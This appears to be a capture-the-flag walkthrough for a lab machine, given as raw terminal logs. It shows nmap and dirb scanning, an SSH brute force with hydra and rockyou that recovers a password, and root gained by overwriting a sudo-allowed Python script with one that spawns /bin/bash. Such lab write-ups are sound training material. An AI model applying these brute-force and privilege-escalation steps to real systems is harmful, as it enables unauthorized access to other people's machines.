IP: 10.10.144.191

Nmap scan results:

root@LAPTOP-U5913CMD:/home/akshay/Desktop# nmap -A -T4 10.10.144.191
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-13 12:53 IST
Nmap scan report for 10.10.144.191
Host is up (0.14s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to  Blog - Library Machine
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/13%OT=22%CT=1%CU=43269%PV=Y%DS=2%DC=T%G=Y%TM=5FAE34
OS:8E%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)SE
OS:Q(SP=107%GCD=1%ISR=108%TI=Z%CI=I%TS=8)OPS(O1=M505ST11NW6%O2=M505ST11NW6%
OS:O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)WIN(W1=68DF%W2
OS:=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNS
OS:NW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE

root@LAPTOP-U5913CMD:/home/akshay# dirb http://10.10.144.191

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Fri Nov 13 12:53:41 2020
URL_BASE: http://10.10.144.191/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.144.191/ ----
==> DIRECTORY: http://10.10.144.191/images/                                                                             
+ http://10.10.144.191/index.html (CODE:200|SIZE:5439)                                                                  
+ http://10.10.144.191/robots.txt (CODE:200|SIZE:33)                                                                    
+ http://10.10.144.191/server-status (CODE:403|SIZE:301)                                                                
                                                                                                                        
---- Entering directory: http://10.10.144.191/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Fri Nov 13 13:04:58 2020
DOWNLOADED: 4612 - FOUND: 3


Contents of robots.txt:
Found nothing


Melodias is the user

root@LAPTOP-U5913CMD:/home/akshay# hydra -l meliodas -P /home/akshay/Downloads/rockyou.txt ssh://10.10.144.191
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-13 13:02:10
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.144.191:22/
[STATUS] 177.00 tries/min, 177 tries in 00:01h, 14344222 to do in 1350:41h, 16 active
[22][ssh] host: 10.10.144.191   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-13 13:04:04
root@LAPTOP-U5913CMD:/home/akshay#

root@LAPTOP-U5913CMD:/home/akshay# ssh meliodas@10.10.144.191
The authenticity of host '10.10.144.191 (10.10.144.191)' can't be established.
ECDSA key fingerprint is SHA256:sKxkgmnt79RkNN7Tn25FLA0EHcu3yil858DSdzrX4Dc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.144.191' (ECDSA) to the list of known hosts.
meliodas@10.10.144.191's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
meliodas@ubuntu:~$ id
uid=1000(meliodas) gid=1000(meliodas) groups=1000(meliodas),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
meliodas@ubuntu:~$


meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
meliodas@ubuntu:~$ ls
bak.py  user.txt
meliodas@ubuntu:~$ rm bak.py
rm: remove write-protected regular file 'bak.py'? y
meliodas@ubuntu:~$ ls
user.txt
meliodas@ubuntu:~$ touch bak.py
meliodas@ubuntu:~$ nano bak.py
Write this script to get root

import os

os.system('/bin/bash')

meliodas@ubuntu:~$ sudo -u root /usr/bin/python3 /home/meliodas/bak.py
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~#
